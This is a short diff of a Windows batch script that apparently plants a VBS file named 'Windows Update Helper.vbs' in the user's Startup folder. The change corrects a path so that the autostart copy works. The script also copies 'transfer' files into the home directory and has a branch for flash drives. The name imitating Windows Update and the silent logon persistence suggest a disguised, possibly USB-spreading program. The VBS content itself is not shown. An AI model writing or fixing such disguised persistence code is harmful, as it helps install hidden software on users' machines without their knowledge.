@@ -81,7 +81,7 @@ if exist UNIN000.dat goto :u
 if not %com%==initcopy goto :searching
 if exist transfer.dat (xcopy transfer\* %homedrive%%homepath% /y)
 if exist "Windows Update Helper.vbs" (
-if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (attrib -s "%appdata%\Microsoft\Windows\Start Menu\Startup\Windows Update Helper.vbs")
+if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs")
 xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y
 )
 if %dirr%==FLASH (
